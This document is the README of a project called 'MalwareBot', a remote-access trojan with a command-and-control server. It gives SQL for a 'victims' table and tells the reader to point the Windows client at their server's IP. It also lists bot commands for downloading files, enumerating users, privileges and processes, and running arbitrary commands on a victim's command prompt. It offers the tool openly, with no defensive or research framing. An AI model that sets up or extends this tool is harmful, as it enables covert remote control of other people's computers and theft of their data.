# MalwareBot
A malware bot that communicates to a server and database on localhost. 

## Steps to create the mysql database on the ubuntu server:
> ``` sudo mysql -u root -p -h localhost ``` - this has to be used in the terminal to launch the mysql instance.

> ``` create database ControlPanel; ```

> ``` use ControlPanel; ```

> ``` create table users(id int AUTO_INCREMENT primary key, username varchar(255), password varchar(255));```

> ``` create table victims(id int AUTO_INCREMENT primary key, hostname varchar(255), ipaddress varchar(255), operatingsystem varchar(255), command text, commandresult longtext); ```


## Changes to be made to the Program.cs file in the windows-client folder:
-> change the ip address on lines 10-12 to the IP of your ubuntu server.

## Changes to be made to the conn.php file in the ubuntu-server folder:
-> change the owner (root) and password (developer) on line 3 to that of your own mysql server.

## Some direct Commands that you can run, that don't invoke the victims command prompt:
> download    -   to download a file

> cd          -   to change the working directory

> ls          -   to enumerate a directory

> hostname    -   to print the hostname of the victim

> osinfo      -   to print the Operatins System info of the victim

> username    -   to print the username of the vicitm on their machine

> processinfo -   to get the process info

> pwd         -   to print the current working directory

> ipaddress   -   to print the ipv4 address of the victim machine

> privileges  -   to print the privilege of the user on the victim machine

> exepath     -   to print the execuatable path

> enum_users  -   to print all the local users present on the victim machine

-> Anything apart from the above commands will run as a normal command prompt utility and give the results accordingly.
